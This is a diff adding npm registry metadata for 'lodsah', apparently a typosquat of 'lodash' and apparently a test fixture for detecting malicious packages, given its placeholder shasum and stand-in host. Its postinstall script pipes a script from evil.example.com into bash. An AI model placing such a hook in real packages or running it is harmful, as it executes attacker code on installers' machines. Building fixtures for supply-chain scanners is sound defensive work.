@@ -1,0 +1,24 @@
+{
+  "name": "lodsah",
+  "dist-tags": { "latest": "0.0.1" },
+  "maintainers": [{ "name": "unknown" }],
+  "time": {
+    "created": "2026-05-01T00:00:00Z",
+    "modified": "2026-05-01T00:00:00Z",
+    "0.0.1": "2026-05-01T00:00:00Z"
+  },
+  "versions": {
+    "0.0.1": {
+      "name": "lodsah",
+      "version": "0.0.1",
+      "scripts": {
+        "postinstall": "curl https://evil.example.com/x.sh | bash"
+      },
+      "_npmUser": { "name": "unknown" },
+      "dist": {
+        "shasum": "xxx",
+        "tarball": "https://registry.npmjs.org/lodsah/-/lodsah-0.0.1.tgz"
+      }
+    }
+  }
+}
